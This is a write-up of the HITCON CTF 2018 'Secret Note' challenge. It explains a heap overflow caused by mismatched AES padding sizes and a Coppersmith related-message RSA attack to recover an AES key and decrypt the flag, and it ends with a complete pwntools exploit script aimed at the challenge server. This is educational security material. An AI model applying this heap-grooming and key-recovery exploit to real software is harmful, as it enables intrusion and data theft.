---
layout: post
title: HITCON CTF 2018 - Secret Note
description: Writeup for challenge "Secret Note" of HITCON CTF 2018.
comments: true
---

Last weekend, I played HITCON CTF 2018 for a bit with our spritzers team.
I did not have much free time, so I ended up focusing on a single hard challenge: Secret Note (342 points, pwn/crypto).
I have been doing pwn for a while, but recently I have also become interested in crypto, so it looked like fun, and indeed it was!

This challenge had two parts: in the first, you had to read the flag from a note-taking application.
In the second, you had to exploit that same application to get a shell.
I only did the first part (IMHO, the second part is pretty straightforward after the first).
You can grab the files [here](/assets/ctf/hitcon18/secretnote-491dade343642f09f71b1c123b4e168a.zip) if you want to play around with it.

### Overview

We are given two files: `N.txt`, which contains a big number, and `note`, a stripped 64-bit Linux ELF with all mitigations enabled (full RELRO, stack canary, NX, PIE).

After some reversing, I had a decent picture.
Here are the main findings:
- `note` is a note-taking application that supports AES and RSA encryption.
- `N.txt` is the RSA modulus for note encryption, the public exponent is 217.
- AES is used in CBC mode, with a 16-byte key read from `key.txt` (not provided) and a random IV initialized at startup from `/dev/urandom`.
- RSA is used in texbook/raw mode, i.e., $$ m^e \equiv c \pmod n $$.
- The application stores the notes unencrypted in memory, and encrypts them for output when showing the contents to the user. This means that the application never decrypts, as such, there is not private RSA key around.

The menu shown to the user is as follows:

```
Secret note:
1. add note
2. show note
3. remove note
4. exit
```

Each note has a index between 0 and 19 and can be up to 96 bytes long.
When adding a note, the user chooses an encryption type between 1 (AES) and 2 (RSA).
When showing a note, the contents are encrypted with the chosen cipher before being presented to the user.

The application creates two default notes at startup:
- Note 0 is `flag:` followed by the contents of `flag.txt` (not provided), for a total size of 45 bytes, and is encrypted with AES.
- Note 1 is `key:` followed by the contents of `key.txt` (the 16-byte AES key, not provided), for a total size of 20 bytes, and is encrypted with RSA.

### The bug

This actually took a while to find: the bug is in how padding is handled differently by the allocation logic and by the AES routines.

Let's start from some basics.
The structure for a note is as follows:

```c
struct note {
    /* Raw note contents (not a string!) */
    char data[96];
    /* Maximum value 96 */
    int size;
    /* 1 = AES, 2 = RSA */
    int encryption_type;
}; // sizeof(struct note) == 0x68
```

The notes are allocated on the heap, and the array `struct note *g_notes[20]` at 0x203360 in BSS keeps track of allocated notes.
Showing a note is handled by the function at 0x1965.
The AES path is as follows:

```c
if (g_notes[idx]->enc_type == 1) {
    /* Pad size to a multiple of AES block size (16) */
    int padded_size = g_notes[idx]->size;
    if (padded_size & 0xF)
        padded_size = (padded_size & 0xFFFFFFF0) + 16;
    /* Encrypt note */
    struct cipher_buf *buf = calloc(padded_size + 4, 1uLL);
    buf->size = g_notes[idx]->size;
    memcpy(buf->data, g_notes[idx], g_notes[idx]->size);
    AES_encrypt_CBC(g_key, g_iv, buf); // @ 0x1a84
    /* Show encrypted data */
    for (int i = 0; i < padded_size; i++)
        printf("%02x", buf->data[i]);
    putchar('\n');
    free(buf);
}
```

This code copies the note contents into a temporary buffer for encryption, and takes into account AES padding when calculating the allocation size to avoid overflows.
The `cipher_buf` structure is:

```c
struct cipher_buf {
    int size;
    char data[];
};
```

Encryption is performed in-place on this buffer by `AES_encrypt_CBC`, which starts out by calling the function at 0x111B to perform PKCS#7 padding:

```c
size_t aes_pad(char *buf, int size) // @ 0x111b
{
    char n = 16 - (size & 0xF);
    for (int i = 0; i < n; i++)
        buf[size + i] = n;
    return size + n;
}
```

Notice the difference?
When the plaintext size is already a multiple of 16, the two functions handle it differently.
The allocation code does not add any extra space, while the AES padding function adds a whole new block of padding (the latter is the correct behavior according to PKCS#7, by the way).

This means that showing an AES note with a size that is a multiple of 16 will cause 16 bytes of AES padding to overflow from a heap buffer.
The padding is then encrypted, we do not know the key, and the IV is random.
Therefore, we have zero control over the encrypted padding.

### Exploitation

Since there was no control over the overflown data, which will be pseudorandom garbage, I excluded the possibility of attacking heap metadata.
The only way out must be corrupting some application data on the heap.
There's only one kind of data kept on the heap: notes (the cipher buffers are short-lived).

Let's assume we manage to get an overflowing cipher buffer allocated right before a note.
When allocating the buffer, the program reserves 4 bytes more than the note size (which is a multiple of 16) for the `size` field of the buffer.
Heap chunk sizes are aligned to 16 bytes, and the chunk size includes the 8-byte size header.
Therefore, there will be 4 padding bytes at the end of the chunk, which "absorb" the first 4 bytes of overflow.
The following 8 bytes are the next chunk's size header, which will be brutally corrupted.
In the end, the last 4 bytes of the encrypted padding will overwrite the first 4 bytes of the next chunk's user data, i.e., the first 4 bytes of the next note's content (as it is the first field in `struct note`).

Corrupting the beginning of a note's data doesn't sound very interesting - we can create arbitrary notes.
However, maybe corrupting one of the two default notes could leak some information about their plaintext?
Notes 0 and 1 are allocated one after the other, therefore, note 1 (AES key) follows note 0 (flag) in memory.
A note is 0x68 bytes, thus it allocates a 0x70 bytes chunk.
A 96-byte note will produce a 0x64 cipher buffer allocation, which again falls in the 0x70 bin.
Therefore, by freeing note 0 and showing a 96-byte AES note, we can get the cipher buffer into the old note 0's place and overflow 4 random bytes into the beginning of note 1's data.

### Related messages

Note 1 contains `key:` followed by the 16-byte AES key, and is encrypted with RSA.
The overflow will overwrite exactly the `key:` part.
Therefore, we can generate RSA encryptions of the AES key with different prefixes.
We can abuse this to run the attack in [Low-Exponent RSA with Related Messages ](https://pdfs.semanticscholar.org/899a/4fdc048102471875e24f7fecb3fb8998d754.pdf) (Coppersmith et al.) and recover the AES key.

Let $$p$$ be a 4-byte prefix, and $$k$$ be the fixed 16-byte AES key.
Let $$ m_p = p\cdot 2^{16\cdot 8} + k $$ be the plaintext for $$ p \| k $$, and let $$ c_p = m_p^e \mod n $$ be the corresponding RSA ciphertext.
Consider the polynomial $$ \mathcal{P}_p(x) = (p\cdot 2^{16\cdot 8} + x)^e - c_p $$ over $$\mathbb{Z}_n$$.
Then $$ \mathcal{P}_p(k) = 0\,\forall p $$.
Therefore, $$(x-k)$$ must be a factor of every $$\mathcal{P}_p(x)$$.
If we take two prefixes $$p_1$$ and $$p_2$$, except in rare cases (see paper), we have $$ \mathcal{K}(x) = gcd(\mathcal{P}_{p_1}(x), \mathcal{P}_{p_2}(x)) = x-k $$.
Solving $$ \mathcal{K}(x) = 0 $$ yields $$k$$.

For one prefix, we can use the default one (`key:`).
To get a second prefix, we can overflow the padding.
However, the show code prints according to the allocation size, so it won't print out the encrypted padding, which we need to know to build the polynomial.
Fortunately, we can encrypt it ourselves.
Let $$ c_1, \mathellipsis, c_m $$ be ciphertext blocks of the overflowing note: $$ c_1, \mathellipsis, c_{m-1} $$ are known (they're shown), while $$c_m$$ is the unknown encryption of the padding.
Let $$p_m$$ be the plaintext PKCS#7 padding (16 0x10 bytes).
Since the cipher is in CBC mode, we have $$ c_i = E_k(p_i \oplus c_{i-1}) $$, with $$ c_0 = IV $$.
We choose $$p'_1$$ as an arbitrary plaintext block, and encrypt it at the beginning of a note to obtain $$c'_1$$.
Let $$ p'_2 = p_m \oplus c'_1 \oplus c_{m-1} $$.
We encrypt $$ p'_1 \| p'_2 $$ to get:

$$
\begin{aligned}
c'_1 \| c'_2 &= c'_1 \| E_k(p'_2 \oplus c'_1) \\
&= c'_1 \| E_k(p_m \oplus c_{m-1}) \\
&= c'_1 \| c_m \\
&\Rightarrow c_m = c'_2
\end{aligned}
$$

Now that we know the encrypted padding block $$c_m$$ we can run the attack and recover $$k$$.
We're almost ready to recover the AES-encrypted flag.
First, we re-connect to the challenge to get note 0 back (it was sacrificed for the overflow).
Then, we calculate the IV from a known plaintext-ciphertext combination $$(p,c)$$ at the beginning of a note: $$ IV = D_k(c) \oplus p $$.
We have $$k$$ and $$IV$$, therefore, we can decrypt the flag in note 0: `hitcon{*?!@_funny_c3ypt0_4nd_pwN__$$%#}`. That was fun!

### Exploit code

```python
#!/usr/bin/env python2

from pwn import *
import sympy
from Crypto.Cipher import AES

NOTE_FLAG = 0
NOTE_KEY  = 1

ENC_AES = 1
ENC_RSA = 2

RSA_E = 217
with open('N.txt', 'r') as f:
    RSA_N = int(f.read())

p = None
g_notes = None

bytes2int = lambda s: int(s.encode('hex'), 16)
int2bytes = lambda x: '{:x}'.format(x).decode('hex')
xor = lambda a, b: ''.join(chr(ord(x) ^ ord(y)) for x, y in zip(a, b))

def init():
    global p, g_notes
    #p = process('./note')
    p = remote('52.194.203.194', 21700)
    g_notes = [True]*2 + [False]*18

def menu(choice):
    p.recvuntil('4. exit\n')
    p.sendline(str(choice))

def add_note(data='', enc=ENC_AES, idx=None, size=None):
    global g_notes
    if idx is None:
        idx = g_notes.index(False)
    if size is None:
        size = len(data)
    menu(1)
    p.recvuntil('index:')
    p.sendline(str(idx))
    p.recvuntil('Encryption type:')
    p.sendline(str(enc))
    p.recvuntil('Note size:')
    p.sendline(str(size))
    p.recvuntil('Note:')
    p.send(data)
    g_notes[idx] = True
    return idx

def show_note(idx):
    menu(2)
    p.recvuntil('index:')
    p.sendline(str(idx))
    return p.recvline().strip().decode('hex')

def remove_note(idx):
    global g_notes
    menu(3)
    p.recvuntil('index:')
    p.sendline(str(idx))
    g_notes[idx] = False

def fetch_related():
    keys = []
    init()

    # original prefix is 'key:'
    prog = log.progress('Getting original message')
    keys.append((bytes2int('key:'), bytes2int(show_note(NOTE_KEY))))
    prog.success()

    prog = log.progress('Creating related message')
    # get tcache out of the way
    tcache_notes = [add_note() for _ in range(7)]
    idx_oob = add_note('A'*0x60) # size % 16 == 0
    for idx in tcache_notes:
        remove_note(idx)
    # hole for overflowing buffer
    remove_note(NOTE_FLAG)
    # fixup heap
    add_note()
    # overflow last 4 bytes of AES padding into key
    # also grab previous ctxt block for predicting padding
    prev_ctxt = show_note(idx_oob)[-16:]
    # grab overflowed encryption of key
    related_key = bytes2int(show_note(NOTE_KEY))
    prog.success()

    prog = log.progress('Recovering encrypted padding')
    # grab ctxt for 'A'*16 at beginning
    first_ctxt = show_note(add_note('A'*17))[:16]
    # pkcs#7
    pad_ptxt = '\x10'*16
    # block will be XORed with first_ctxt, eliminate
    pad_ptxt = xor(pad_ptxt, first_ctxt)
    # want to encrypt like it was after prev_ctxt
    pad_ptxt = xor(pad_ptxt, prev_ctxt)
    # grab the encrypted padding
    pad_ctxt = show_note(add_note('A'*16 + pad_ptxt + 'A'))[16:32]
    overflow = pad_ctxt[12:]
    keys.append((bytes2int(overflow), related_key))
    prog.success()

    p.close()
    return keys

def recover_key(keys):
    prog = log.progress('Recovering AES key')
    m = sympy.symbols('m')
    polys = [((a << 16*8) + m)**RSA_E - c for a, c in keys]
    gcd = sympy.gcd(polys[0], polys[1], modulus=RSA_N)
    key = int2bytes(int(sympy.solve(gcd)[0]))
    prog.success(key.encode('hex'))
    return key

def get_flag(key):
    init()

    prog = log.progress('Recovering IV')
    iv_ctxt = show_note(add_note('\x00'*17))[:16]
    aes_ecb = AES.new(key, AES.MODE_ECB)
    iv = aes_ecb.decrypt(iv_ctxt)
    prog.success(iv.encode('hex'))

    prog = log.progress('Decrypting flag note')
    flag_ctxt = show_note(NOTE_FLAG)
    aes_cbc = AES.new(key, AES.MODE_CBC, iv)
    unpad = lambda s: s[:-ord(s[-1])]
    flag = unpad(aes_cbc.decrypt(flag_ctxt))
    prog.success(flag)

    p.close()
    return flag

if __name__ == '__main__':
    keys = fetch_related()
    key = recover_key(keys)
    get_flag(key)
```
